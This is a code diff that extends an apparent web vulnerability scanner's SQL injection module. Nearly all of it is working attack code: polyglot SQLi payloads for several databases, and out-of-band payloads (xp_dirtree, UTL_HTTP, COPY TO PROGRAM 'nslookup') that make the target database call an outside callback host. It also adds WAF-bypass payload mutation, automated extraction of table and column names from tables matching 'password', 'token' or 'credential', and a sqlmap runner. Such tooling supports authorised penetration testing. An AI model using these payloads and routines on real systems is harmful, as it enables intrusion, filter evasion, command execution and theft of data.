@@ -4,7 +4,7 @@ import random
 import re
 import statistics
 import threading
-from typing import List, Dict, Any, Optional, Tuple
+from typing import Callable, List, Dict, Any, Optional, Tuple
 from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
 
 import requests as _requests
@@ -316,6 +316,13 @@ class SQLInjectionScanner(BaseScanner):
                     all_forms.extend(page["forms"])
             if all_forms:
                 self.scan_forms(all_forms)
+
+        # ─── Adım 3 eklentileri: OOB / Stacked / Adaptive / SQLMap ─────────
+        self._run_oob_phase(urls)
+        self._run_stacked_query_phase(urls)
+        self._run_adaptive_scan(urls)
+        if urls:
+            self._run_sqlmap_bridge(urls[0])
 
     def scan_url(self, url: str):
         parsed = urlparse(url)
@@ -701,7 +708,629 @@ class SQLInjectionScanner(BaseScanner):
             logger.warning("[SQLi] cmdi modülü yüklenemedi, CMDI taraması atlanıyor")
             return False
 
+    # ─── Adım 3 — SQLInjectionScanner eklenti metodları ─────────────────────
+
+    def _run_oob_phase(self, urls: List[str]) -> None:
+        """OOB DNS SQLi via interactsh OAST. Callback doğrulaması async."""
+        try:
+            from websecure.core.oast import OASTClient
+            oob_host = OASTClient().get_host()
+        except Exception:
+            oob_host = "ws-oob.internal"
+
+        prober = OOBSQLiProber()
+        for url in urls:
+            parsed = urlparse(url)
+            for param, _ in parse_qsl(parsed.query):
+                sent = prober.probe(url, param, self.session, self.inject_param, oob_host)
+                if sent:
+                    self.report_finding(
+                        vuln_type="SQL Injection (OOB DNS — Pending Callback)",
+                        url=url,
+                        param=param,
+                        payload=sent[0]["payload"],
+                        severity="High",
+                        evidence=(
+                            f"OOB payloads sent → {oob_host}. "
+                            f"Check OAST server for DNS/HTTP callbacks. "
+                            f"Payloads tried: {len(sent)}"
+                        ),
+                        extra={"oob_host": oob_host, "payloads_sent": len(sent)},
+                    )
+                    break  # one finding per URL is enough
+
+    def _run_stacked_query_phase(self, urls: List[str]) -> None:
+        """Stacked query (multi-statement) tespiti — time-based cross-validation."""
+        prober = StackedQueryProber()
+        for url in urls:
+            parsed = urlparse(url)
+            params = parse_qsl(parsed.query)
+            if not params:
+                continue
+            for param, _ in params:
+                result = prober.probe(url, param, self.session, self.inject_param)
+                if result:
+                    payload, db_hint, evidence = result
+                    self.report_finding(
+                        vuln_type="SQL Injection (Stacked Query)",
+                        url=url,
+                        param=param,
+                        payload=payload,
+                        severity="Critical",
+                        evidence=evidence,
+                        extra={"db_hint": db_hint},
+                    )
+                    # Schema extraction fırsatı: stacked query = arbitrary SELECT
+                    self._run_schema_extraction(url, param, db_hint)
+
+    def _run_schema_extraction(self, url: str, param: str, db_hint: str = "mysql") -> None:
+        """Confirmed SQLi sonrası non-destructive DB şema çıkarımı."""
+        extractor = SchemaExtractor()
+        schema = extractor.run_schema_extraction(url, param, self.session, self.inject_param, db_hint)
+        if schema.get("tables"):
+            self.report_finding(
+                vuln_type="SQL Injection — DB Schema Extracted",
+                url=url,
+                param=param,
+                payload="UNION SELECT GROUP_CONCAT(table_name)",
+                severity="Critical",
+                evidence=(
+                    f"Tables: {schema['tables'][:10]} | "
+                    f"Sensitive tables: {schema['sensitive_tables']} | "
+                    f"Columns: {schema['columns']}"
+                ),
+                extra={"schema": schema},
+            )
+
+    def _run_adaptive_scan(self, urls: List[str]) -> None:
+        """WAF-aware adaptive scanning: polyglot payloads + variant mutation."""
+        mutator = AdaptivePayloadMutator()
+        for url in urls:
+            parsed = urlparse(url)
+            params = parse_qsl(parsed.query)
+            if not params:
+                continue
+            baseline = self.fetch_baseline(url, timeout=10)
+            if not baseline:
+                continue
+            baseline_errors = self._extract_error_fingerprints(baseline.text)
+            for param, _ in params:
+                for payload in _POLYGLOT_SQLI_PAYLOADS[:15]:
+                    result = mutator.send_adaptive(
+                        url, self.session, param, payload, self.inject_param
+                    )
+                    if not result:
+                        continue
+                    variant, status_code, body = result
+                    new_errors = self._extract_error_fingerprints(body) - baseline_errors
+                    if new_errors:
+                        db = next(iter(new_errors))[0]
+                        self.report_finding(
+                            vuln_type="SQL Injection (Adaptive/WAF Bypass)",
+                            url=url,
+                            param=param,
+                            payload=variant,
+                            severity="Critical",
+                            evidence=f"WAF bypassed: {db} error via mutation — HTTP {status_code}",
+                        )
+                        break
+
+    def _run_sqlmap_bridge(self, url: str) -> None:
+        """Confirmed bulgular için SQLMap CLI doğrulaması."""
+        if not self.results.get("offensive"):
+            return
+        bridge = SQLMapBridge()
+        if not bridge.is_available():
+            logger.debug("[SQLi/SQLMap] sqlmap PATH'de bulunamadı, bridge atlanıyor")
+            return
+        parsed = urlparse(url)
+        params = parse_qsl(parsed.query)
+        if not params:
+            return
+        param = params[0][0]
+        result = bridge.confirm(url, param)
+        if result.get("success"):
+            self.report_finding(
+                vuln_type="SQL Injection (SQLMap Confirmed)",
+                url=url,
+                param=param,
+                payload="sqlmap --technique=BEUST",
+                severity="Critical",
+                evidence=(
+                    f"SQLMap bağımsız olarak doğruladı. "
+                    f"Output dir: {result.get('output_dir')}"
+                ),
+                extra={"sqlmap": result},
+            )
+
 
 def run(url, session=None, results=None, debug=False, **kwargs):
     scanner = SQLInjectionScanner(session, results, debug)
     scanner.run(url)
+
+
+# =============================================================================
+# ADIM 3 — SQL Injection Üst Düzey: Standalone Bileşenler
+# =============================================================================
+
+# Polyglot SQLi payload seti: MySQL + MSSQL + Oracle + PostgreSQL + SQLite
+# aynı anda etki eden payloadlar — WAF-aware adaptive scan için kullanılır.
+_POLYGLOT_SQLI_PAYLOADS: List[str] = [
+    # Evrensel hata tetikleyiciler
+    "'", "\"", "`;",
+    # MySQL error-based
+    "' AND extractvalue(1,concat(0x7e,version()))-- -",
+    "' AND updatexml(1,concat(0x7e,user()),1)-- -",
+    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
+    # MySQL time-based
+    "' AND SLEEP(3)-- -",
+    "' OR IF(1=1,SLEEP(3),0)-- -",
+    # MSSQL error-based
+    "' AND 1=CONVERT(int,@@version)-- -",
+    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -",
+    # MSSQL time-based
+    "'; WAITFOR DELAY '0:0:3'-- -",
+    # PostgreSQL error-based
+    "' AND 1=CAST(version() AS int)-- -",
+    # PostgreSQL time-based
+    "' AND (SELECT pg_sleep(3))-- -",
+    # Oracle
+    "' AND 1=TO_NUMBER('x')-- -",
+    "' UNION SELECT NULL,NULL FROM DUAL-- -",
+    # SQLite
+    "' AND 1=1-- -",
+    "' UNION SELECT sqlite_version(),NULL-- -",
+    # UNION-based (sütun sayısı brute-force)
+    "' UNION SELECT NULL-- -",
+    "' UNION SELECT NULL,NULL-- -",
+    "' UNION SELECT NULL,NULL,NULL-- -",
+    "' ORDER BY 1-- -",
+    "' ORDER BY 50-- -",
+    # Boolean
+    "' AND '1'='1-- -",
+    "' OR ''='",
+    "1 OR 1=1",
+    "admin'--",
+    # Stacked queries
+    "'; SELECT 1-- -",
+    "'; SELECT SLEEP(3)-- -",
+    "'; WAITFOR DELAY '0:0:3'-- -",
+]
+
+
+class OOBSQLiProber:
+    """
+    Out-of-band DNS SQLi via OAST callback URL.
+
+    MySQL:      LOAD_FILE(UNC path) → DNS lookup
+    MSSQL:      xp_dirtree / xp_fileexist → DNS lookup
+    Oracle:     UTL_HTTP.REQUEST → HTTP callback
+    PostgreSQL: COPY TO PROGRAM 'nslookup' → DNS lookup
+
+    Actual confirmation is async — check the OAST server for incoming requests.
+    """
+
+    _TEMPLATES: Dict[str, List[str]] = {
+        "mysql": [
+            "' AND LOAD_FILE(CONCAT('\\\\\\\\','{h}','.wsec\\\\x'))-- -",
+            "' UNION SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,'{h}',0x5c5c78))-- -",
+        ],
+        "mssql": [
+            "'; EXEC master..xp_dirtree '//{h}/wsec'-- -",
+            "'; EXEC master..xp_fileexist '//{h}/wsec'-- -",
+        ],
+        "oracle": [
+            "' AND UTL_HTTP.REQUEST('http://{h}/wsec')='x'-- -",
+            "' UNION SELECT UTL_HTTP.REQUEST('http://{h}/wsec') FROM DUAL-- -",
+        ],
+        "postgresql": [
+            "'; CREATE TEMP TABLE _ws AS SELECT 1; COPY _ws TO PROGRAM 'nslookup {h}'-- -",
+        ],
+    }
+
+    def probe(
+        self,
+        url: str,
+        param: str,
+        session: Any,
+        inject_fn: Callable,
+        oob_host: str,
+    ) -> List[Dict[str, Any]]:
+        """
+        Send all OOB payloads. Returns list of {db, payload} for each sent request.
+        Caller must check OAST server separately for callback confirmation.
+        """
+        sent: List[Dict[str, Any]] = []
+        for db, templates in self._TEMPLATES.items():
+            for tpl in templates:
+                payload = tpl.format(h=oob_host)
+                injected = inject_fn(url, param, payload)
+                try:
+                    session.get(injected, timeout=10)
+                    sent.append({"db": db, "payload": payload})
+                except Exception:
+                    pass
+        return sent
+
+
+class StackedQueryProber:
+    """
+    Detects stacked query (multi-statement) SQLi via time-based confirmation.
+    Uses non-destructive SLEEP / WAITFOR / pg_sleep payloads only.
+    Multi-shot confirmation eliminates single-spike false positives.
+    """
+
+    _PAYLOADS: List[Tuple[str, str]] = [
+        ("'; SELECT SLEEP(3)-- -",       "mysql"),
+        ("'; WAITFOR DELAY '0:0:3'-- -", "mssql"),
+        ("'; SELECT pg_sleep(3)-- -",    "postgresql"),
+        ("||(SELECT SLEEP(3))||",        "mysql_concat"),
+        ("'; SELECT 1-- -",              "generic"),
+    ]
+
+    def probe(
+        self,
+        url: str,
+        param: str,
+        session: Any,
+        inject_fn: Callable,
+        time_threshold: float = 2.5,
+        confirm_n: int = 2,
+    ) -> Optional[Tuple[str, str, str]]:
+        """Returns (payload, db_hint, evidence) or None."""
+        for payload, db_hint in self._PAYLOADS:
+            injected = inject_fn(url, param, payload)
+            hits = 0
+            for _ in range(confirm_n):
+                t0 = time.time()
+                try:
+                    session.get(injected, timeout=time_threshold + 5)
+                    if time.time() - t0 >= time_threshold:
+                        hits += 1
+                except _requests.exceptions.Timeout:
+                    hits += 1
+                except Exception:
+                    pass
+            if hits >= confirm_n:
+                evidence = (
+                    f"Stacked query confirmed ({hits}/{confirm_n} shots ≥ {time_threshold}s) "
+                    f"— db_hint: {db_hint}"
+                )
+                return payload, db_hint, evidence
+        return None
+
+
+class SchemaExtractor:
+    """
+    Non-destructive DB schema extraction via UNION-based SQLi.
+    Extracts table names → column names for sensitive tables.
+    Only uses SELECT queries — never modifies data.
+    """
+
+    _SENSITIVE_RE = re.compile(
+        r"(?i)(user|account|admin|member|customer|password|passwd|secret|"
+        r"credential|token|api_key|config|setting|session|auth|login|email)",
+    )
+
+    _TABLE_QUERIES: Dict[str, str] = {
+        "mysql": (
+            "' UNION SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR '|'),NULL "
+            "FROM information_schema.tables WHERE table_schema=database()-- -"
+        ),
+        "mssql": (
+            "' UNION SELECT STRING_AGG(table_name,'|'),NULL "
+            "FROM information_schema.tables-- -"
+        ),
+        "postgresql": (
+            "' UNION SELECT STRING_AGG(table_name,'|'),NULL "
+            "FROM information_schema.tables WHERE table_schema='public'-- -"
+        ),
+        "oracle": (
+            "' UNION SELECT LISTAGG(table_name,'|') WITHIN GROUP (ORDER BY table_name),NULL "
+            "FROM all_tables WHERE ROWNUM<50-- -"
+        ),
+        "sqlite": (
+            "' UNION SELECT GROUP_CONCAT(name,'|'),NULL "
+            "FROM sqlite_master WHERE type='table'-- -"
+        ),
+    }
+
+    _COLUMN_QUERIES: Dict[str, str] = {
+        "mysql": (
+            "' UNION SELECT GROUP_CONCAT(column_name ORDER BY column_name SEPARATOR '|'),NULL "
+            "FROM information_schema.columns WHERE table_name='{t}'-- -"
+        ),
+        "mssql": (
+            "' UNION SELECT STRING_AGG(column_name,'|'),NULL "
+            "FROM information_schema.columns WHERE table_name='{t}'-- -"
+        ),
+        "postgresql": (
+            "' UNION SELECT STRING_AGG(column_name,'|'),NULL "
+            "FROM information_schema.columns WHERE table_name='{t}'-- -"
+        ),
+        "sqlite": (
+            "' UNION SELECT GROUP_CONCAT(name,'|'),NULL "
+            "FROM pragma_table_info('{t}')-- -"
+        ),
+    }
+
+    def extract_tables(
+        self, url: str, param: str, session: Any, inject_fn: Callable, db_hint: str = "mysql"
+    ) -> List[str]:
+        query = self._TABLE_QUERIES.get(db_hint, self._TABLE_QUERIES["mysql"])
+        try:
+            r = session.get(inject_fn(url, param, query), timeout=12)
+            return list(dict.fromkeys(re.findall(r'([a-z_][a-z0-9_]{1,64})\|', r.text, re.I)))
+        except Exception:
+            return []
+
+    def extract_columns(
+        self, url: str, param: str, session: Any, inject_fn: Callable,
+        table: str, db_hint: str = "mysql",
+    ) -> List[str]:
+        tmpl = self._COLUMN_QUERIES.get(db_hint, self._COLUMN_QUERIES["mysql"])
+        try:
+            r = session.get(inject_fn(url, param, tmpl.format(t=table)), timeout=12)
+            return list(dict.fromkeys(re.findall(r'([a-z_][a-z0-9_]{1,64})\|', r.text, re.I)))
+        except Exception:
+            return []
+
+    def run_schema_extraction(
+        self, url: str, param: str, session: Any, inject_fn: Callable, db_hint: str = "mysql"
+    ) -> Dict[str, Any]:
+        tables = self.extract_tables(url, param, session, inject_fn, db_hint)
+        sensitive = [t for t in tables if self._SENSITIVE_RE.search(t)]
+        columns: Dict[str, List[str]] = {}
+        for table in sensitive[:5]:  # en fazla 5 hassas tablo
+            cols = self.extract_columns(url, param, session, inject_fn, table, db_hint)
+            if cols:
+                columns[table] = cols
+        return {"tables": tables, "sensitive_tables": sensitive, "columns": columns}
+
+
+class SecondOrderSQLiProber:
+    """
+    Second-order (persistent) SQLi tespiti.
+
+    Phase 1: Write endpoint'e dormant payload depola.
+    Phase 2: Read/process endpoint'te SQL hata imzası ara.
+    Farklı kod yolunda tetiklenen injection'ları yakalar.
+    """
+
+    _DORMANT: List[str] = [
+        "ws_so_{uid}'",
+        "ws_so_{uid}\"",
+        "ws_so_{uid}' OR '1'='1",
+        "ws_so_{uid}' AND 1=1-- -",
+        "ws_so_{uid}'; SELECT 1-- -",
+    ]
+
+    _ERROR_PATTERNS: List[str] = [
+        r"SQL syntax", r"ORA-\d{4}", r"PostgreSQL.*ERROR",
+        r"SQLITE_ERROR", r"Unclosed quotation", r"mysql_fetch",
+        r"Warning.*mysql", r"syntax error.*unexpected",
+    ]
+
+    def probe(
+        self,
+        write_url: str,
+        read_urls: List[str],
+        param: str,
+        session: Any,
+        method: str = "POST",
+    ) -> Optional[Dict[str, Any]]:
+        import uuid as _uuid
+        uid = _uuid.uuid4().hex[:8]
+
+        for tpl in self._DORMANT:
+            payload = tpl.format(uid=uid)
+            try:
+                if method.upper() == "POST":
+                    session.post(write_url, data={param: payload}, timeout=10)
+                else:
+                    session.get(write_url, params={param: payload}, timeout=10)
+            except Exception:
+                continue
+
+            for read_url in read_urls:
+                try:
+                    r = session.get(read_url, timeout=10)
+                    for pat in self._ERROR_PATTERNS:
+                        if re.search(pat, r.text, re.I):
+                            return {
+                                "write_url": write_url,
+                                "read_url": read_url,
+                                "param": param,
+                                "payload": payload,
+                                "evidence": f"Second-order SQLi: pattern '{pat}' triggered at {read_url}",
+                            }
+                except Exception:
+                    pass
+        return None
+
+
+class StoredSQLiProber:
+    """
+    Stored SQLi: inject unique string marker at write endpoint,
+    check for unescaped reflection at read endpoints.
+    Distinct from SecondOrderSQLiProber: focuses on marker reflection, not SQL errors.
+    """
+
+    _MARKERS: List[str] = [
+        "ws_stored_{uid}'",
+        "ws_stored_{uid}\"",
+        "ws_stored_{uid}",
+    ]
+
+    def probe(
+        self,
+        write_url: str,
+        read_urls: List[str],
+        param: str,
+        session: Any,
+        method: str = "POST",
+    ) -> Optional[Dict[str, Any]]:
+        import uuid as _uuid
+        uid = _uuid.uuid4().hex[:8]
+        raw_marker = f"ws_stored_{uid}"
+
+        for tpl in self._MARKERS:
+            marker_val = tpl.format(uid=uid)
+            try:
+                if method.upper() == "POST":
+                    session.post(write_url, data={param: marker_val}, timeout=10)
+                else:
+                    session.get(write_url, params={param: marker_val}, timeout=10)
+            except Exception:
+                continue
+
+            for read_url in read_urls:
+                try:
+                    r = session.get(read_url, timeout=10)
+                    if raw_marker in r.text:
+                        return {
+                            "write_url": write_url,
+                            "read_url": read_url,
+                            "param": param,
+                            "payload": marker_val,
+                            "evidence": f"Stored SQLi: marker '{raw_marker}' unescaped at {read_url}",
+                        }
+                except Exception:
+                    pass
+        return None
+
+
+class AdaptivePayloadMutator:
+    """
+    WAF-aware adaptive payload mutation.
+    When a request returns WAF block codes (400/403/406/429),
+    automatically generates 8 variant forms and retries.
+    """
+
+    _BLOCK_CODES: frozenset = frozenset({400, 403, 406, 429})
+
+    def send_adaptive(
+        self,
+        url: str,
+        session: Any,
+        param: str,
+        payload: str,
+        inject_fn: Callable,
+        timeout: int = 10,
+    ) -> Optional[Tuple[str, int, str]]:
+        """Try payload + variants. Returns (effective_payload, status, body) or None."""
+        for variant in self._variants(payload):
+            injected = inject_fn(url, param, variant)
+            try:
+                r = session.get(injected, timeout=timeout)
+                if r.status_code not in self._BLOCK_CODES:
+                    return variant, r.status_code, r.text
+            except Exception:
+                pass
+        return None
+
+    def _variants(self, payload: str) -> List[str]:
+        v = [payload]
+
+        # 1. SQL keyword case swap
+        swapped = payload
+        for kw in ("SELECT", "UNION", "WHERE", "FROM", "AND", "OR", "SLEEP", "WAITFOR", "ORDER", "BY"):
+            swapped = swapped.replace(kw, kw.swapcase())
+        v.append(swapped)
+
+        # 2. Inline comment injection between whitespace
+        v.append(re.sub(r' ', '/**/', payload))
+
+        # 3. URL encode special chars
+        v.append(payload.replace("'", "%27").replace('"', "%22").replace(" ", "%20"))
+
+        # 4. Double URL encode
+        v.append(payload.replace("'", "%2527").replace('"', "%2522").replace(" ", "%2520"))
+
+        # 5. Newline-as-space (bypasses space filters)
+        v.append(payload.replace(" ", "\n"))
+
+        # 6. Tab-as-space
+        v.append(payload.replace(" ", "\t"))
+
+        # 7. MySQL scientific notation for numeric literals
+        v.append(re.sub(r'\b(\d+)\b', lambda m: f"{m.group(1)}e0", payload))
+
+        # 8. Hex-encode short string literals inside single quotes
+        def _hex_str(s: str) -> str:
+            return re.sub(
+                r"'([^']{1,20})'",
+                lambda m: f"0x{m.group(1).encode().hex()}",
+                s,
+            )
+        v.append(_hex_str(payload))
+
+        return v
+
+
+class SQLMapBridge:
+    """
+    SQLMap CLI entegrasyonu: WebSecure tespit edilen SQLi'yi bağımsız olarak doğrular.
+    Sadece onaylanan bulgular için çağrılır.
+    Non-destructive: --technique=BEUST, --level=1, --risk=1, --batch.
+    """
+
+    _CMD = "sqlmap"
+    _TIMEOUT = 120
+
+    def is_available(self) -> bool:
+        import shutil
+        return shutil.which(self._CMD) is not None
+
+    def confirm(
+        self,
+        url: str,
+        param: str,
+        output_dir: Optional[str] = None,
+        extra_args: Optional[List[str]] = None,
+    ) -> Dict[str, Any]:
+        """SQLMap çalıştır ve sonucu döndür."""
+        if not self.is_available():
+            return {"success": False, "error": "sqlmap PATH'de bulunamadı"}
+
+        import subprocess as _sp
+        import tempfile
+
+        out_dir = output_dir or tempfile.mkdtemp(prefix="ws_sqlmap_")
+        cmd = [
+            self._CMD,
+            "-u", url,
+            "-p", param,
+            "--batch",
+            "--level=1",
+            "--risk=1",
+            "--technique=BEUST",
+            f"--output-dir={out_dir}",
+        ]
+        if extra_args:
+            cmd.extend(extra_args)
+
+        try:
+            proc = _sp.run(
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=self._TIMEOUT,
+                check=False,
+            )
+            stdout = proc.stdout or ""
+            confirmed = (
+                "sqlmap identified" in stdout.lower()
+                or "parameter appears to be" in stdout.lower()
+                or "is vulnerable" in stdout.lower()
+            )
+            return {
+                "success": confirmed,
+                "returncode": proc.returncode,
+                "output": stdout[:3000],
+                "output_dir": out_dir,
+            }
+        except _sp.TimeoutExpired:
+            return {"success": False, "error": f"sqlmap {self._TIMEOUT}s'de zaman aşımı"}
+        except Exception as exc:
+            return {"success": False, "error": str(exc)}
